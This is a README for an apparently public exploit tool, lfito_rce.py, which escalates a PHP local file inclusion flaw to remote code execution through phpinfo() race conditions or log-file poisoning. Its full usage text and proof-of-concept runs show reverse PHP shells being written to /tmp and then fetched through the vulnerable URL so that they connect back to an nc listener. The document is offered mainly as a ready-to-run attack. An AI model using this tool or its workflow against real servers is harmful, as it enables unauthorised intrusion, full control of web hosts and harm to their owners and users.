# LFI to RCE via phpinfo() assistance or via controlled log file 

For more details about exploit via phpinfo(). Research from [here](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

For more details about exploit via controlled log file. A writeup from [here](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

# Use case
#### About LFI to RCE via phpinfo()
- Found an LFI Vulnerability
- Any script that displays the output of the PHPInfo() function will do. In most cases this will be /phpinfo.php 

#### About LFI to RCE via controlled log file
- Found an LFI Vulnerability
- found the web server log file path or try paths from script.

# Usage 

```
usage: lfito_rce.py [-h] [-a ACTION] -l LFI --lhost LHOST --lport LPORT
                         [--payload PTYPE] [-e REQEND] [-v VERBOSE]
                         [-t THREADS] [-i PHPINFO] [-f LOGFILE]

RCE from LFI with PHPINFO assistance or Via controlled log file

optional arguments:
  -h, --help            show this help message and exit
  -a ACTION, --action ACTION
                        Define the attack type - 1 for PHPINFO and - 2 for
                        controlled log. Value 1 by default
  -l LFI, --lfi LFI     the url path of the LFI vuln, per example
                        "http://127.0.0.1:8080/lfi.php?file="
  --lhost LHOST         The local ip to listen, for rev shell
  --lport LPORT         The local port to listen, for rev shell
  --payload PTYPE       Set the type of payload to use. 1|2|3 By default
                        payload is set to 3
  -e REQEND, --end REQEND
                        Define any end of lfi request, per examlpe "%00" by
                        default the end request is empty
  -v VERBOSE, --verbose VERBOSE
                        Define verbose output. set to False by default
  -t THREADS, --threads THREADS
                        [For phpinfo action]. Threads number, set to 10 by
                        default
  -i PHPINFO, --phpinfo PHPINFO
                        [For phpinfo action]. Define the url path of the
                        "phpinfo" script. Per ex: "http://host/phpinfo.php"
  -f LOGFILE, --logfile LOGFILE
                        [For controlled log action]. Define the path of the
                        http server log file. By default script will use
                        bruteforce

```


# POC
#### About LFI to RCE via phpinfo() 

```
$ python lfito_rce.py -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001  -t 12  -i "http://host:8080/phpinfo.php"

 ____   ____   ____   ____ _     _       _              _ 
|  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
| |_) / / _` | |  | | |  _| '_ \| |_  / | __/ _ \ / _ \| |
|  _ < | (_| | |  | | |_| | | | | |/ /  | || (_) | (_) | |
|_| \_\ \__,_| |  | |\____|_| |_|_/___|  \__\___/ \___/|_|
       \____/ \_\/_/                                      

Find all scripts in: https://github.com/roughiz


LFI With PHPInfo() RCE script
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Spawning worker pool (12)...
  24 /  1000
Got it! Reverse php Shell created in /tmp/IVA1XpPtHGjS.php

Yep! The payload works great !

I will execute the reverse shell, requesting the url: http://host/browse.php?file=/tmp/IVA1XpPtHGjS.php

Verify your nc listenner 127.0.0.1:9001
Shuttin' down...

```

#### About LFI to RCE via controlled log file

```
$ python lfito_rce.py -a 2 -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001

 ____   ____   ____   ____ _     _       _              _ 
|  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
| |_) / / _` | |  | | |  _| '_ \| |_  / | __/ _ \ / _ \| |
|  _ < | (_| | |  | | |_| | | | | |/ /  | || (_) | (_) | |
|_| \_\ \__,_| |  | |\____|_| |_|_/___|  \__\___/ \___/|_|
       \____/ \_\/_/                                      

Find all scripts in: https://github.com/roughiz


LFI RCE via controlled log
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  16 /   26
Got it! Reverse php Shell created in /tmp/k0THSi7vdS58.php

I will execute the reverse shell, requesting the url: http://host/browse.php?file=/tmp/k0THSi7vdS58.php

Verify your nc listenner 127.0.0.1:9001

```

### Nota 

Sometimes you have to use a hight thread value to increase your chances of success !!
 
#### Install the pyfiglet python module like :

```
$ sudo pip install pyfiglet
```

